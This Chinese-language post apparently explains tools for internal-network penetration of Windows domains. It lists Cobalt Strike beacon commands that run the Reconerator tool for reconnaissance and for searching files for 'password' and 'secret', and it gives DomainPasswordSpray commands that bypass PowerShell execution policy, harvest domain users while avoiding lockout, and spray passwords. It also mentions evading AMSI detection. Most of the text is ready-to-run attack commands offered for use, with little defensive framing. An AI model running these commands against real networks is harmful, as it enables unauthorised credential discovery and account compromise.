Powershell作为内网渗透的利器， 在Windows环境下被广泛使用。

利用Poweshell可以降低软件的查杀概率，同时也是无文件攻击的常用手段。在内网渗透中Powershell扮演着重要角色。在这几年PowerShell可以说是被用烂了，已经有相对成熟的技术检测来检测PowerShell比如AMSI，但也有相关的绕过技术，COM、DLL劫持等


而C#与.NET框架紧密的集成，可以说是替代了常用的PowerShell，国外一些黑客已经抛弃了PowerShell的利用，转而进行使用C#来进行内网渗透已经非常成熟。

这个工具主要参考HostEnum.ps1和Get-HostProfile.ps1来进行系统信息收集，需要自己编译。

全部信息

Reconerator

信息收集工作，磁盘和注册表获取信息，ldap查询、dns查询

有对.NET4.0环境要求。 


如在CobaltStrike下操作：

收集信息

beacon> execute-assembly Reconerator.exe basic all

LDAP查询：

beacon> execute-assembly Reconerator.exe ldap "LDAP://W2K8DC/dc=stufus,dc=lan" "objectClass=user" 0

DNS查询：

beacon> execute-assembly Reconerator.exe resolvehost www.google.com

Windows搜索敏感信息

查找密码关键词：

beacon> execute-assembly Reconerator.exe indexsearch "CONTAINS('password')"

查找文件名或路径有stufus名称：

beacon> execute-assembly Reconerator.exe indexsearch "System.ItemPathDisplay LIKE '%stufus%'"

查找文件中包含secret文件内容：

beacon> execute-assembly Reconerator.exe indexsearch "System.ItemName LIKE '%stufus%' OR CONTAINS('secret')"

DomainPasswordSpray

在爆破之前先了解密码策略

$env:PSExecutionPolicyPreference="bypass"Import-Module .\DomainPasswordSpray.ps1Invoke-DomainPasswordSpray -Domain fox.com -Password 123qweasdzxc…


获取用户：

Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt

指定爆破：

Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
